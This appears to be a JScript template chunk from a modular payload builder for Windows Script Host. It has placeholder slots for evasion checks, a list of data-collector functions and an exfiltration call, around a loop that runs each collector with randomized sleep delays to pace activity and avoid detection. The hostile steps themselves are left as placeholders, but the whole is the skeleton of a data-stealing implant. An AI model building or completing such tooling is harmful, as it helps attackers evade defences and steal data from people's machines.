// chunk: arch/paced
// depends: core/emit_buffer, core/run_cmd, core/file_ops
// provides: main
// format: jscript

{{EVASION_CHECKS}}

var _collectors = [{{COLLECTOR_FUNCTIONS}}];
var _delay_ms = {{PACE_DELAY}};

for (var _ci = 0; _ci < _collectors.length; _ci++) {
    try {
        _collectors[_ci]();
    } catch(ex) {
        emit("  [!] Collector " + _ci + " failed: " + ex.message + "\r\n");
    }
    if (_ci < _collectors.length - 1) {
        WScript.Sleep(_delay_ms + Math.floor(Math.random() * _delay_ms));
    }
}

{{EXFIL_CALL}}
